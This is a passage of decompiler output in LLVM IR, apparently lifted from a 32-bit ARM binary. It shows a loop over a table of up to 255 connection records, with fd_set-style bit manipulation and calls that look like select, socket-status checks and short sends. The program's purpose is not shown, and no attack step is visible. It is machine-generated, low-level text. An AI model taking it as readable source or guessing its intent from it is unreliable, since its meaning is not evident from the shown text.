dec_label_pc_10ca0.loopexit:                      ; preds = %dec_label_pc_10c44
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ca0

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c14, %dec_label_pc_10b38, %dec_label_pc_10b08, %dec_label_pc_10ca0.loopexit, %dec_label_pc_10c98
  %stack_var_-1872.1 = phi i32 [ %tmp218, %dec_label_pc_10c98 ], [ %v0_10c04, %dec_label_pc_10ca0.loopexit ], [ %v0_10c04, %dec_label_pc_10b08 ], [ %v0_10c04, %dec_label_pc_10b38 ], [ %v0_10c04, %dec_label_pc_10c14 ]
  %stack_var_-1868.1 = phi i8 [ %tmp219, %dec_label_pc_10c98 ], [ %stack_var_-1868.0, %dec_label_pc_10ca0.loopexit ], [ %stack_var_-1868.0, %dec_label_pc_10b08 ], [ %stack_var_-1868.0, %dec_label_pc_10b38 ], [ %stack_var_-1868.0, %dec_label_pc_10c14 ]
  %stack_var_-1876.1 = phi i8* [ %tmp247, %dec_label_pc_10c98 ], [ %stack_var_-1876.0, %dec_label_pc_10ca0.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_10b08 ], [ %stack_var_-1876.0, %dec_label_pc_10b38 ], [ %stack_var_-1876.0, %dec_label_pc_10c14 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1664, i32* %lr.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v2_10cb4378 = load i32, i32* @sp, align 4
  %v3_10cb4379 = add i32 %v2_10cb4378, 1664
  %v4_10cb4380 = inttoptr i32 %v3_10cb4379 to i32*
  store i32 0, i32* %v4_10cb4380, align 4
  br label %dec_label_pc_10ca8.dec_label_pc_10ca8_crit_edge

dec_label_pc_10ca8.dec_label_pc_10ca8_crit_edge:  ; preds = %dec_label_pc_10ca0, %dec_label_pc_10ca8.dec_label_pc_10ca8_crit_edge
  %v0_10ca8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10cb4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10ca8 = add i32 %v0_10ca8.pre, 1664
  store i32 %v1_10ca8, i32* %lr.global-to-local, align 4
  %v1_10cac = add i32 %v0_10ca8.pre, 4
  store i32 %v1_10cac, i32* %r3.global-to-local, align 4
  %v7_10cb0 = icmp eq i32 %v1_10cac, 128
  %v2_10cb4 = load i32, i32* @sp, align 4
  %v3_10cb4 = add i32 %v2_10cb4, %v1_10ca8
  %v4_10cb4 = inttoptr i32 %v3_10cb4 to i32*
  store i32 %v0_10cb4.pre, i32* %v4_10cb4, align 4
  br i1 %v7_10cb0, label %dec_label_pc_10cbc, label %dec_label_pc_10ca8.dec_label_pc_10ca8_crit_edge

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10ca8.dec_label_pc_10ca8_crit_edge
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10cbc = load i32, i32* %r2.global-to-local, align 4
  %v1_10cc0372 = add i32 %v0_10cbc, 1536
  store i32 %v1_10cc0372, i32* %r0.global-to-local, align 4
  %v1_10cc4373 = add i32 %v0_10cbc, 4
  store i32 %v1_10cc4373, i32* %r3.global-to-local, align 4
  %v7_10cc8374 = icmp eq i32 %v1_10cc4373, 128
  %v2_10ccc375 = load i32, i32* @sp, align 4
  %v3_10ccc376 = add i32 %v2_10ccc375, %v1_10cc0372
  %v4_10ccc377 = inttoptr i32 %v3_10ccc376 to i32*
  store i32 %v0_10cbc, i32* %v4_10ccc377, align 4
  br i1 %v7_10cc8374, label %dec_label_pc_10cd4, label %dec_label_pc_10cc0.dec_label_pc_10cc0_crit_edge

dec_label_pc_10cc0.dec_label_pc_10cc0_crit_edge:  ; preds = %dec_label_pc_10cbc, %dec_label_pc_10cc0.dec_label_pc_10cc0_crit_edge
  %v0_10cc0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10ccc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10cc0 = add i32 %v0_10cc0.pre, 1536
  store i32 %v1_10cc0, i32* %r0.global-to-local, align 4
  %v1_10cc4 = add i32 %v0_10cc0.pre, 4
  store i32 %v1_10cc4, i32* %r3.global-to-local, align 4
  %v7_10cc8 = icmp eq i32 %v1_10cc4, 128
  %v2_10ccc = load i32, i32* @sp, align 4
  %v3_10ccc = add i32 %v2_10ccc, %v1_10cc0
  %v4_10ccc = inttoptr i32 %v3_10ccc to i32*
  store i32 %v0_10ccc.pre, i32* %v4_10ccc, align 4
  br i1 %v7_10cc8, label %dec_label_pc_10cd4, label %dec_label_pc_10cc0.dec_label_pc_10cc0_crit_edge

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cc0.dec_label_pc_10cc0_crit_edge, %dec_label_pc_10cbc
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10cd4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10cd4, i32* @r6, align 4
  store i32 %v0_10cd4, i32* @r5, align 4
  store i32 %v0_10cd4, i32* @r7, align 4
  store i32 %v0_10cd4, i32* %stack_var_-52, align 4
  %v2_10d94 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_10d50

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10d78, %dec_label_pc_10d50
  %storemerge203 = phi i32 [ 30, %dec_label_pc_10d50 ], [ 5, %dec_label_pc_10d78 ]
  store i32 %storemerge203, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e424.184 to i32), i32* %lr.global-to-local, align 4
  %v1_10cec = add i32 %v2_10d64, 8
  %v2_10cec = inttoptr i32 %v1_10cec to i32*
  %v3_10cec = load i32, i32* %v2_10cec, align 4
  store i32 %v3_10cec, i32* %r2.global-to-local, align 4
  %v2_10cf0 = load i32, i32* @global_var_1e424.184, align 4
  %v2_10cf4 = sub i32 %v2_10cf0, %v3_10cec
  store i32 %v2_10cf4, i32* %r3.global-to-local, align 4
  %v3_10cf8 = icmp uge i32 %v2_10cf4, %storemerge203
  %v9_10cf8 = icmp eq i32 %v2_10cf4, %storemerge203
  store i1 %v9_10cf8, i1* %cpsr_z.global-to-local, align 1
  %v2_10cfc = xor i1 %v9_10cf8, true
  %v3_10cfc = and i1 %v3_10cf8, %v2_10cfc
  br i1 %v3_10cfc, label %dec_label_pc_10dbc, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10ce8
  store i1 %v7_10d6c, i1* %cpsr_z.global-to-local, align 1
  %v1_10d88 = add i32 %v2_10d64, 4
  %v2_10d88 = inttoptr i32 %v1_10d88 to i32*
  %v3_10d88 = load i32, i32* %v2_10d88, align 4
  br i1 %v7_10d6c, label %dec_label_pc_10d88, label %dec_label_pc_10d08

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10d00
  store i32 %v3_10d88, i32* %ip.global-to-local, align 4
  %v3_10d10 = udiv i32 %v3_10d88, 32
  store i32 %v2_10d94, i32* %r2.global-to-local, align 4
  %v3_10d18 = mul nuw nsw i32 %v3_10d10, 4
  %v2_10d1c = add i32 %v3_10d18, %v2_10d94
  store i32 %v2_10d1c, i32* %r3.global-to-local, align 4
  %v1_10d20 = add i32 %v2_10d1c, -184
  %v2_10d20 = inttoptr i32 %v1_10d20 to i32*
  %v3_10d20 = load i32, i32* %v2_10d20, align 4
  %v1_10d24 = urem i32 %v3_10d88, 32
  store i32 %v1_10d24, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10d2c = shl i32 1, %v1_10d24
  %v8_10d2c = or i32 %v3_10d20, %v7_10d2c
  store i32 %v8_10d2c, i32* %r2.global-to-local, align 4
  store i32 %v8_10d2c, i32* %v2_10d20, align 4
  %v0_10d34 = load i32, i32* @r6, align 4
  %v1_10d34 = load i32, i32* %ip.global-to-local, align 4
  %v9_10d34 = icmp eq i32 %v0_10d34, %v1_10d34
  store i1 %v9_10d34, i1* %cpsr_z.global-to-local, align 1
  %v5_10d38 = icmp slt i32 %v0_10d34, %v1_10d34
  br i1 %v5_10d38, label %bb283, label %bb284

bb283:                                            ; preds = %dec_label_pc_10d08
  store i32 %v1_10d34, i32* @r6, align 4
  br label %bb284

bb284:                                            ; preds = %dec_label_pc_10d78, %dec_label_pc_10e04, %dec_label_pc_10df8, %bb286, %dec_label_pc_10d08, %bb283
  %v3_10d3c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10d3c, i32* %r3.global-to-local, align 4
  %v1_10d40 = add i32 %v3_10d3c, 1
  store i32 %v1_10d40, i32* %r2.global-to-local, align 4
  %v7_10d44 = icmp eq i32 %v1_10d40, 255
  store i1 %v7_10d44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10d40, i32* %stack_var_-52, align 4
  %v8_10d4c = icmp sgt i32 %v1_10d40, 255
  br i1 %v8_10d4c, label %dec_label_pc_10e10, label %dec_label_pc_10d50

dec_label_pc_10d50:                               ; preds = %bb284, %dec_label_pc_10cd4
  %v0_10d5c = phi i32 [ %v1_10d40, %bb284 ], [ %v0_10cd4, %dec_label_pc_10cd4 ]
  store i32 ptrtoint (i32* @global_var_1e488.196 to i32), i32* %ip.global-to-local, align 4
  %v3_10d54 = mul i32 %v0_10d5c, 256
  store i32 %v3_10d54, i32* %r3.global-to-local, align 4
  %v2_10d58 = load i32, i32* @global_var_1e488.196, align 4
  store i32 %v2_10d58, i32* %r1.global-to-local, align 4
  %v2_10d60 = mul i32 %v0_10d5c, 288
  store i32 %v2_10d60, i32* %r2.global-to-local, align 4
  %v2_10d64 = add i32 %v2_10d58, %v2_10d60
  store i32 %v2_10d64, i32* @r4, align 4
  %v1_10d68 = add i32 %v2_10d64, 12
  %v2_10d68 = inttoptr i32 %v1_10d68 to i32*
  %v3_10d68 = load i32, i32* %v2_10d68, align 4
  store i32 %v3_10d68, i32* %ip.global-to-local, align 4
  %v2_10d6c = icmp ne i32 %v3_10d68, 0
  %v7_10d6c = icmp eq i32 %v3_10d68, 1
  store i1 %v7_10d6c, i1* %cpsr_z.global-to-local, align 1
  %v2_10d70 = xor i1 %v7_10d6c, true
  %v3_10d70 = and i1 %v2_10d6c, %v2_10d70
  br i1 %v3_10d70, label %dec_label_pc_10ce8, label %dec_label_pc_10d78

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d50
  %v2_10d78 = icmp eq i32 %v3_10d68, 0
  store i1 %v2_10d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d78, label %bb284, label %dec_label_pc_10ce8

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d00
  store i32 %v3_10d88, i32* %r0.global-to-local, align 4
  %v3_10d90 = udiv i32 %v3_10d88, 32
  store i32 %v2_10d94, i32* %r1.global-to-local, align 4
  %v3_10d98 = mul nuw nsw i32 %v3_10d90, 4
  %v2_10d9c = add i32 %v3_10d98, %v2_10d94
  store i32 %v2_10d9c, i32* %r3.global-to-local, align 4
  %v1_10da0 = add i32 %v2_10d9c, -312
  %v2_10da0 = inttoptr i32 %v1_10da0 to i32*
  %v3_10da0 = load i32, i32* %v2_10da0, align 4
  %v1_10da4 = urem i32 %v3_10d88, 32
  store i32 %v1_10da4, i32* %r1.global-to-local, align 4
  %v7_10da8 = shl i32 1, %v1_10da4
  %v8_10da8 = or i32 %v3_10da0, %v7_10da8
  store i32 %v8_10da8, i32* %r2.global-to-local, align 4
  %v0_10dac = load i32, i32* @r5, align 4
  %v9_10dac = icmp eq i32 %v0_10dac, %v3_10d88
  store i1 %v9_10dac, i1* %cpsr_z.global-to-local, align 1
  %v5_10db0 = icmp slt i32 %v0_10dac, %v3_10d88
  br i1 %v5_10db0, label %bb285, label %bb286

bb285:                                            ; preds = %dec_label_pc_10d88
  store i32 %v3_10d88, i32* @r5, align 4
  br label %bb286

bb286:                                            ; preds = %dec_label_pc_10d88, %bb285
  store i32 %v8_10da8, i32* %v2_10da0, align 4
  br label %bb284

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10ce8
  %v1_10dbc = add i32 %v2_10d64, 4
  %v2_10dbc = inttoptr i32 %v1_10dbc to i32*
  %v3_10dbc = load i32, i32* %v2_10dbc, align 4
  store i32 %v3_10dbc, i32* %r0.global-to-local, align 4
  %v1_10dc0 = call i32 @function_12e9c(i32 %v3_10dbc)
  store i32 %v1_10dc0, i32* %r0.global-to-local, align 4
  %v0_10dc4 = load i32, i32* @r4, align 4
  %v1_10dc4 = add i32 %v0_10dc4, 12
  %v2_10dc4 = inttoptr i32 %v1_10dc4 to i32*
  %v3_10dc4 = load i32, i32* %v2_10dc4, align 4
  store i32 %v3_10dc4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v7_10dcc = icmp eq i32 %v3_10dc4, 2
  store i1 %v7_10dcc, i1* %cpsr_z.global-to-local, align 1
  %v2_10dd0 = add i32 %v0_10dc4, 4
  %v3_10dd0 = inttoptr i32 %v2_10dd0 to i32*
  store i32 -1, i32* %v3_10dd0, align 4
  %tmp432 = icmp ult i32 %v3_10dc4, 3
  br i1 %tmp432, label %dec_label_pc_10df8, label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10dbc
  store i32 ptrtoint (i32* @global_var_1e3f0.186 to i32), i32* %r3.global-to-local, align 4
  %v3_10ddc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10ddc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* %r0.global-to-local, align 4
  %v2_10de4 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_10de4, i32* %r2.global-to-local, align 4
  %v4_10de8 = mul i32 %v3_10ddc, 4
  %v5_10de8 = add i32 %v4_10de8, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v6_10de8 = inttoptr i32 %v5_10de8 to i32*
  %v7_10de8 = load i32, i32* %v6_10de8, align 4
  store i32 %v7_10de8, i32* %r3.global-to-local, align 4
  %v1_10dec = add i32 %v2_10de4, -1
  store i32 %v1_10dec, i32* %r2.global-to-local, align 4
  %v9_10df0 = icmp eq i32 %v7_10de8, %v1_10dec
  store i1 %v9_10df0, i1* %cpsr_z.global-to-local, align 1
  %v7_10df4 = icmp sgt i32 %v7_10de8, %v1_10dec
  br i1 %v7_10df4, label %dec_label_pc_10df8, label %dec_label_pc_10e04

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10dbc
  %v0_10df8 = load i32, i32* @r7, align 4
  %v1_10df8 = load i32, i32* @r4, align 4
  %v2_10df8 = add i32 %v1_10df8, 12
  %v3_10df8 = inttoptr i32 %v2_10df8 to i32*
  store i32 %v0_10df8, i32* %v3_10df8, align 4
  %v0_10dfc = load i32, i32* @r7, align 4
  %v1_10dfc = trunc i32 %v0_10dfc to i8
  %v2_10dfc = load i32, i32* @r4, align 4
  %v3_10dfc = add i32 %v2_10dfc, 284
  %v4_10dfc = inttoptr i32 %v3_10dfc to i8*
  store i8 %v1_10dfc, i8* %v4_10dfc, align 1
  br label %bb284

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10dd8
  %v0_10e04 = load i32, i32* @r4, align 4
  store i32 %v0_10e04, i32* @r0, align 4
  %v0_10e08 = call i32 @function_100f8()
  store i32 %v0_10e08, i32* %r0.global-to-local, align 4
  br label %bb284

dec_label_pc_10e10:                               ; preds = %bb284
  store i32 1, i32* %stack_var_-64, align 4
  %v0_10e18 = load i32, i32* @r6, align 4
  %v1_10e18 = load i32, i32* @r5, align 4
  %v9_10e18 = icmp eq i32 %v0_10e18, %v1_10e18
  store i1 %v9_10e18, i1* %cpsr_z.global-to-local, align 1
  %v5_10e1c = icmp slt i32 %v0_10e18, %v1_10e18
  %storemerge83 = select i1 %v5_10e1c, i32 %v1_10e18, i32 %v0_10e18
  %v2_10e24 = ptrtoint i32* %stack_var_-76 to i32
  %v2_10e28 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_10e28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10e30 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10e30, i32* %ip.global-to-local, align 4
  %v2_10e34 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v2_10e34, i32* %r1.global-to-local, align 4
  %v1_10e38 = add i32 %storemerge83, 1
  store i32 %v1_10e38, i32* %r0.global-to-local, align 4
  %v5_10e44 = call i32 @function_130bc(i32 %v1_10e38, i32 %v2_10e34, i32 %v2_10e28, i32 0, i32 %v2_10e30)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10e4c = call i32 @function_1316c(i32* null)
  store i32 ptrtoint (i32* @global_var_1e424.184 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_10e4c, i32* @global_var_1e424.184, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_117c0 = ptrtoint i32* %stack_var_-41 to i32
  %v2_117d0 = ptrtoint i32* %stack_var_-73 to i32
  %v2_11270 = ptrtoint i32* %stack_var_-56 to i32
  %v2_11324 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_10ea4

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10ec8, %bb291
  %v0_10e80 = phi i32 [ %v3_10ebc, %dec_label_pc_10ec8 ], [ %v0_10e68.pre, %bb291 ]
  %v3_10e68 = udiv i32 %v0_10e80, 32
  store i32 %v2_10d94, i32* %r1.global-to-local, align 4
  %v3_10e74 = mul nuw nsw i32 %v3_10e68, 4
  %v2_10e78 = add i32 %v3_10e74, %v2_10d94
  store i32 %v2_10e78, i32* %r3.global-to-local, align 4
  %v1_10e7c = add i32 %v2_10e78, -184
  %v2_10e7c = inttoptr i32 %v1_10e7c to i32*
  %v3_10e7c = load i32, i32* %v2_10e7c, align 4
  %v1_10e80 = urem i32 %v0_10e80, 32
  store i32 %v1_10e80, i32* %r1.global-to-local, align 4
  %v6_10e84 = lshr i32 %v3_10e7c, %v1_10e80
  store i32 %v6_10e84, i32* %r2.global-to-local, align 4
  %v1_10e88 = urem i32 %v6_10e84, 2
  %v2_10e88 = icmp eq i32 %v1_10e88, 0
  store i1 %v2_10e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e88, label %dec_label_pc_10e90, label %dec_label_pc_10fd4.preheader

dec_label_pc_10fd4.preheader:                     ; preds = %dec_label_pc_10e68
  %v0_10fd4104 = load i32, i32* @r5, align 4
  %v1_10fd4105 = add i32 %v0_10fd4104, 12
  %v2_10fd4106 = inttoptr i32 %v1_10fd4105 to i32*
  %v3_10fd4107 = load i32, i32* %v2_10fd4106, align 4
  store i32 %v3_10fd4107, i32* %r1.global-to-local, align 4
  %v2_10fd8103109 = icmp eq i32 %v3_10fd4107, 0
  store i1 %v2_10fd8103109, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fd8103109, label %dec_label_pc_10e90, label %dec_label_pc_10fe0.lr.ph

dec_label_pc_10e90:                               ; preds = %dec_label_pc_10fd4.loopexit, %dec_label_pc_10fd4.preheader, %.thread81, %dec_label_pc_10e68, %dec_label_pc_11904, %dec_label_pc_10ea4, %dec_label_pc_119bc, %dec_label_pc_1194c
  %v3_10e90 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10e90, i32* %r3.global-to-local, align 4
  %v1_10e94 = add i32 %v3_10e90, 1
  store i32 %v1_10e94, i32* %r2.global-to-local, align 4
  %v7_10e98 = icmp eq i32 %v1_10e94, 255
  store i1 %v7_10e98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10e94, i32* %stack_var_-52, align 4
  %v8_10ea0 = icmp sgt i32 %v1_10e94, 255
  br i1 %v8_10ea0, label %dec_label_pc_10874, label %dec_label_pc_10ea4

dec_label_pc_10ea4:                               ; preds = %dec_label_pc_10e90, %dec_label_pc_10e10
  %v0_10eb0 = phi i32 [ %v1_10e94, %dec_label_pc_10e90 ], [ 0, %dec_label_pc_10e10 ]
  store i32 ptrtoint (i32* @global_var_1e488.196 to i32), i32* %ip.global-to-local, align 4
  %v3_10ea8 = mul i32 %v0_10eb0, 256
  store i32 %v3_10ea8, i32* %r3.global-to-local, align 4
  %v2_10eac = load i32, i32* @global_var_1e488.196, align 4
  store i32 %v2_10eac, i32* %r1.global-to-local, align 4
  %v2_10eb4 = mul i32 %v0_10eb0, 288
  store i32 %v2_10eb4, i32* %r2.global-to-local, align 4
  %v2_10eb8 = add i32 %v2_10eac, %v2_10eb4
  store i32 %v2_10eb8, i32* @r5, align 4
  %v1_10ebc = add i32 %v2_10eb8, 4
  %v2_10ebc = inttoptr i32 %v1_10ebc to i32*
  %v3_10ebc = load i32, i32* %v2_10ebc, align 4
  store i32 %v3_10ebc, i32* %r0.global-to-local, align 4
  %v7_10ec0 = icmp eq i32 %v3_10ebc, -1
  store i1 %v7_10ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ec0, label %dec_label_pc_10e90, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10ea4
  %v3_10ec8 = udiv i32 %v3_10ebc, 32
  %v3_10ed0 = mul nuw nsw i32 %v3_10ec8, 4
  store i32 %v2_10d94, i32* @lr, align 4
  %v2_10ed8 = add i32 %v3_10ed0, %v2_10d94
  store i32 %v2_10ed8, i32* %r3.global-to-local, align 4
  %v1_10edc = add i32 %v2_10ed8, -312
  %v2_10edc = inttoptr i32 %v1_10edc to i32*
  %v3_10edc = load i32, i32* %v2_10edc, align 4
  %v1_10ee0 = urem i32 %v3_10ebc, 32
  store i32 %v1_10ee0, i32* %r1.global-to-local, align 4
  %v6_10ee4 = lshr i32 %v3_10edc, %v1_10ee0
  store i32 %v6_10ee4, i32* %r2.global-to-local, align 4
  %v1_10ee8 = urem i32 %v6_10ee4, 2
  %v2_10ee8 = icmp eq i32 %v1_10ee8, 0
  store i1 %v2_10ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ee8, label %dec_label_pc_10e68, label %dec_label_pc_10ef0

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10ec8
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_11324, i32* %r3.global-to-local, align 4
  store i32 %v2_11270, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v6_10f1c = call i32 @function_13644(i32 %v3_10ebc, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_11270)
  %v3_10f20 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10f20, i32* %r3.global-to-local, align 4
  %v2_10f24 = or i32 %v3_10f20, %v6_10f1c
  store i32 %v2_10f24, i32* %r0.global-to-local, align 4
  %v4_10f24 = icmp eq i32 %v2_10f24, 0
  store i1 %v4_10f24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10f24, label %dec_label_pc_10f2c, label %dec_label_pc_119bc

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10ef0
  store i32 ptrtoint (i32* @global_var_1e3f0.186 to i32), i32* %r3.global-to-local, align 4
  %v3_10f30 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10f30, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* @lr, align 4
  %v2_10f38 = load i32, i32* @global_var_1e3f0.186, align 4
  store i32 %v2_10f38, i32* %r0.global-to-local, align 4
  %v4_10f3c = mul i32 %v3_10f30, 4
  %v5_10f3c = add i32 %v4_10f3c, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v6_10f3c = inttoptr i32 %v5_10f3c to i32*
  %v7_10f3c = load i32, i32* %v6_10f3c, align 4
  store i32 %v7_10f3c, i32* %r2.global-to-local, align 4
  %v1_10f40 = add i32 %v2_10f38, -1
  store i32 %v1_10f40, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v9_10f48 = icmp eq i32 %v7_10f3c, %v1_10f40
  store i1 %v9_10f48, i1* %cpsr_z.global-to-local, align 1
  %v1_10f4c = load i32, i32* @r5, align 4
  %v2_10f4c = add i32 %v1_10f4c, 12
  %v3_10f4c = inttoptr i32 %v2_10f4c to i32*
  store i32 2, i32* %v3_10f4c, align 4
  %v8_10f50 = icmp sgt i32 %v7_10f3c, %v1_10f40
  br i1 %v8_10f50, label %dec_label_pc_119bc, label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f2c
  %v0_10f54 = load i32, i32* %r2.global-to-local, align 4
  %v1_10f54 = load i32, i32* %r0.global-to-local, align 4
  %v9_10f54 = icmp eq i32 %v0_10f54, %v1_10f54
  store i1 %v9_10f54, i1* %cpsr_z.global-to-local, align 1
  %v5_10f58 = icmp slt i32 %v0_10f54, %v1_10f54
  br i1 %v5_10f58, label %bb288, label %bb287

bb287:                                            ; preds = %dec_label_pc_10f54
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_10f6446 = load i32, i32* @r5, align 4
  %v2_10f6447 = add i32 %v1_10f6446, 24
  %v3_10f6448 = inttoptr i32 %v2_10f6447 to i32*
  store i32 0, i32* %v3_10f6448, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* %r0.global-to-local, align 4
  br label %bb289

bb288:                                            ; preds = %dec_label_pc_10f54
  store i32 ptrtoint (i32* @global_var_1e41c.188 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v8_10f60 = load i32, i32* @global_var_1e41c.188, align 4
  store i32 %v8_10f60, i32* %r1.global-to-local, align 4
  %v1_10f6441 = load i32, i32* @r5, align 4
  %v2_10f6442 = add i32 %v1_10f6441, 24
  %v3_10f6443 = inttoptr i32 %v2_10f6442 to i32*
  store i32 0, i32* %v3_10f6443, align 4
  %v6_10f68 = load i32, i32* %r2.global-to-local, align 4
  %v9_10f68 = mul i32 %v6_10f68, 16
  store i32 %v9_10f68, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* %r0.global-to-local, align 4
  %v7_10f70 = load i32, i32* %r1.global-to-local, align 4
  %v8_10f70 = add i32 %v7_10f70, %v9_10f68
  store i32 %v8_10f70, i32* %r1.global-to-local, align 4
  br label %bb289

bb289:                                            ; preds = %bb287, %bb288
  %v3_10f74 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10f74, i32* %r2.global-to-local, align 4
  %v4_10f78 = mul i32 %v3_10f74, 4
  %v5_10f78 = add i32 %v4_10f78, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v6_10f78 = inttoptr i32 %v5_10f78 to i32*
  %v7_10f78 = load i32, i32* %v6_10f78, align 4
  %v1_10f7c = add i32 %v7_10f78, 1
  store i32 %v1_10f7c, i32* %r3.global-to-local, align 4
  store i32 %v1_10f7c, i32* %v6_10f78, align 4
  %v0_10f84 = load i32, i32* @r5, align 4
  %v1_10f84 = add i32 %v0_10f84, 4
  %v2_10f84 = inttoptr i32 %v1_10f84 to i32*
  %v3_10f84 = load i32, i32* %v2_10f84, align 4
  store i32 %v3_10f84, i32* %r0.global-to-local, align 4
  br i1 %v5_10f58, label %._crit_edge, label %bb290

._crit_edge:                                      ; preds = %bb289
  %v0_10f8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb291

bb290:                                            ; preds = %bb289
  %v6_10f88 = load i32, i32* @r4, align 4
  store i32 %v6_10f88, i32* %r1.global-to-local, align 4
  br label %bb291

bb291:                                            ; preds = %._crit_edge, %bb290
  %v0_10f8c = phi i32 [ %v0_10f8c.pre, %._crit_edge ], [ %v6_10f88, %bb290 ]
  %v2_10f8c = inttoptr i32 %v0_10f84 to i32*
  store i32 %v0_10f8c, i32* %v2_10f8c, align 4
  %v0_10e68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e68

dec_label_pc_10f94:                               ; preds = %dec_label_pc_1119c, %dec_label_pc_11170, %dec_label_pc_111b8
  store i32 %v3_11170, i32* %r1.global-to-local, align 4
  %v0_10f98 = load i32, i32* @r8, align 4
  store i32 %v0_10f98, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_158f0.310 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_10fa4 = call i32 @function_125a0(i32 %v0_10f98, i32 %v3_11170, i32 ptrtoint ([5 x i8]* @global_var_158f0.310 to i32), i32 4)
  store i32 %v5_10fa4, i32* %r0.global-to-local, align 4
  %v3_10fa8 = icmp eq i32 %v5_10fa4, -1
  %v8_10fa8 = icmp eq i32 %v5_10fa4, -1
  store i1 %v8_10fa8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_10fa4, i32* @r7, align 4
  br i1 %v3_10fa8, label %dec_label_pc_10fb4, label %dec_label_pc_111c4

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10f94
  %v0_10fb4 = load i32, i32* @r8, align 4
  store i32 %v0_10fb4, i32* %r0.global-to-local, align 4
  %v0_10fb8 = load i32, i32* @r5, align 4
  %v1_10fb8 = add i32 %v0_10fb8, 24
  %v2_10fb8 = inttoptr i32 %v1_10fb8 to i32*
  %v3_10fb8 = load i32, i32* %v2_10fb8, align 4
  store i32 %v3_10fb8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_158f8.312 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
